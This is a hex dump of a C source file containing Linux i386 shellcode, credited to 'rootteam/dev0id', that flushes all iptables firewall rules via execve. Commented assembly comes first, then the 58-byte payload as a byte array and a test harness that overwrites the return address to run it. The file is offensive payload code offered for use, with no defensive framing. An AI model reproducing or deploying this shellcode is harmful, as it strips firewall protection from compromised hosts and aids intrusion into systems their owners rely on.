00000000  2f 2a 20 54 68 65 20 73  68 65 6c 6c 63 6f 64 65  |/* The shellcode|
00000010  20 66 6c 75 73 68 73 20  74 68 65 20 69 70 74 61  | flushs the ipta|
00000020  62 6c 65 73 20 20 62 79  20 72 75 6e 6e 69 6e 67  |bles  by running|
00000030  20 2f 73 62 69 6e 2f 69  70 74 61 62 6c 65 73 20  | /sbin/iptables |
00000040  2d 46 0d 0a 20 20 20 6e  6f 20 65 78 69 74 28 29  |-F..   no exit()|
00000050  0d 0a 20 20 20 67 72 65  65 74 7a 20 74 6f 20 7a  |..   greetz to z|
00000060  69 6c 69 6f 6e 3a 20 6d  61 6e 2c 20 6d 79 20 63  |ilion: man, my c|
00000070  6f 64 65 20 69 73 20 73  68 6f 72 74 65 72 21 0d  |ode is shorter!.|
00000080  0a 0d 0a 20 20 20 73 69  7a 65 20 3d 20 35 38 20  |...   size = 58 |
00000090  62 79 74 65 73 20 0d 0a  20 20 20 4f 53 09 3d 20  |bytes ..   OS.= |
000000a0  4c 69 6e 75 78 20 69 33  38 36 0d 0a 20 09 09 77  |Linux i386.. ..w|
000000b0  72 69 74 74 65 6e 20 62  79 20 2f 72 6f 6f 74 74  |ritten by /roott|
000000c0  65 61 6d 2f 64 65 76 30  69 64 20 28 77 77 77 2e  |eam/dev0id (www.|
000000d0  73 79 73 77 6f 72 6c 64  2e 6e 65 74 29 0d 0a 20  |sysworld.net).. |
000000e0  0d 0a 0d 0a 42 49 54 53  09 33 32 0d 0a 0d 0a 6a  |....BITS.32....j|
000000f0  6d 70 09 73 68 6f 72 74  09 63 61 6c 6c 6d 65 0d  |mp.short.callme.|
00000100  0a 6d 61 69 6e 3a 0d 0a  09 70 6f 70 09 65 73 69  |.main:...pop.esi|
00000110  0d 0a 09 78 6f 72 09 65  61 78 2c 65 61 78 0d 0a  |...xor.eax,eax..|
00000120  09 6d 6f 76 20 62 79 74  65 20 5b 65 73 69 2b 31  |.mov byte [esi+1|
00000130  34 5d 2c 61 6c 0d 0a 09  6d 6f 76 20 62 79 74 65  |4],al...mov byte|
00000140  20 5b 65 73 69 2b 31 37  5d 2c 61 6c 0d 0a 09 6d  | [esi+17],al...m|
00000150  6f 76 20 6c 6f 6e 67 20  5b 65 73 69 2b 31 38 5d  |ov long [esi+18]|
00000160  2c 65 73 69 0d 0a 09 6c  65 61 09 20 65 62 78 2c  |,esi...lea. ebx,|
00000170  5b 65 73 69 2b 31 35 5d  0d 0a 09 6d 6f 76 20 6c  |[esi+15]...mov l|
00000180  6f 6e 67 20 5b 65 73 69  2b 32 32 5d 2c 65 62 78  |ong [esi+22],ebx|
00000190  0d 0a 09 6d 6f 76 20 6c  6f 6e 67 20 5b 65 73 69  |...mov long [esi|
000001a0  2b 32 36 5d 2c 65 61 78  0d 0a 09 6d 6f 76 20 09  |+26],eax...mov .|
000001b0  61 6c 2c 30 78 30 62 0d  0a 09 6d 6f 76 09 65 62  |al,0x0b...mov.eb|
000001c0  78 2c 65 73 69 0d 0a 09  6c 65 61 09 65 63 78 2c  |x,esi...lea.ecx,|
000001d0  5b 65 73 69 2b 31 38 5d  0d 0a 09 6c 65 61 09 65  |[esi+18]...lea.e|
000001e0  64 78 2c 5b 65 73 69 2b  32 36 5d 0d 0a 09 69 6e  |dx,[esi+26]...in|
000001f0  74 09 30 78 38 30 0d 0a  09 0d 0a 0d 0a 63 61 6c  |t.0x80.......cal|
00000200  6c 6d 65 3a 0d 0a 09 63  61 6c 6c 09 6d 61 69 6e  |lme:...call.main|
00000210  0d 0a 09 64 62 20 27 2f  73 62 69 6e 2f 69 70 74  |...db '/sbin/ipt|
00000220  61 62 6c 65 73 23 2d 46  23 27 0d 0a 2a 2f 0d 0a  |ables#-F#'..*/..|
00000230  0d 0a 0d 0a 63 68 61 72  20 73 68 65 6c 6c 63 6f  |....char shellco|
00000240  64 65 5b 5d 20 3d 0d 0a  09 22 5c 78 65 62 5c 78  |de[] =..."\xeb\x|
00000250  32 31 5c 78 35 65 5c 78  33 31 5c 78 63 30 5c 78  |21\x5e\x31\xc0\x|
00000260  38 38 5c 78 34 36 5c 78  30 65 5c 78 38 38 5c 78  |88\x46\x0e\x88\x|
00000270  34 36 5c 78 31 31 5c 78  38 39 5c 78 37 36 5c 78  |46\x11\x89\x76\x|
00000280  31 32 5c 78 38 64 22 0d  0a 09 22 5c 78 35 65 5c  |12\x8d"..."\x5e\|
00000290  78 30 66 5c 78 38 39 5c  78 35 65 5c 78 31 36 5c  |x0f\x89\x5e\x16\|
000002a0  78 38 39 5c 78 34 36 5c  78 31 61 5c 78 62 30 5c  |x89\x46\x1a\xb0\|
000002b0  78 30 62 5c 78 38 39 5c  78 66 33 5c 78 38 64 5c  |x0b\x89\xf3\x8d\|
000002c0  78 34 65 5c 78 31 32 22  0d 0a 09 22 5c 78 38 64  |x4e\x12"..."\x8d|
000002d0  5c 78 35 36 5c 78 31 61  5c 78 63 64 5c 78 38 30  |\x56\x1a\xcd\x80|
000002e0  5c 78 65 38 5c 78 64 61  5c 78 66 66 5c 78 66 66  |\xe8\xda\xff\xff|
000002f0  5c 78 66 66 5c 78 32 66  5c 78 37 33 5c 78 36 32  |\xff\x2f\x73\x62|
00000300  5c 78 36 39 5c 78 36 65  22 0d 0a 09 22 5c 78 32  |\x69\x6e"..."\x2|
00000310  66 5c 78 36 39 5c 78 37  30 5c 78 37 34 5c 78 36  |f\x69\x70\x74\x6|
00000320  31 5c 78 36 32 5c 78 36  63 5c 78 36 35 5c 78 37  |1\x62\x6c\x65\x7|
00000330  33 5c 78 32 33 5c 78 32  64 5c 78 34 36 5c 78 32  |3\x23\x2d\x46\x2|
00000340  33 22 3b 0d 0a 0d 0a 09  0d 0a 69 6e 74 20 6d 61  |3";.......int ma|
00000350  69 6e 28 29 0d 0a 7b 0d  0a 0d 0a 20 20 69 6e 74  |in()..{....  int|
00000360  20 2a 72 65 74 3b 0d 0a  20 20 72 65 74 20 3d 20  | *ret;..  ret = |
00000370  28 69 6e 74 20 2a 29 26  72 65 74 20 2b 20 32 3b  |(int *)&ret + 2;|
00000380  0d 0a 20 20 28 2a 72 65  74 29 20 3d 20 28 69 6e  |..  (*ret) = (in|
00000390  74 29 73 68 65 6c 6c 63  6f 64 65 3b 0d 0a 7d     |t)shellcode;..}|
0000039f
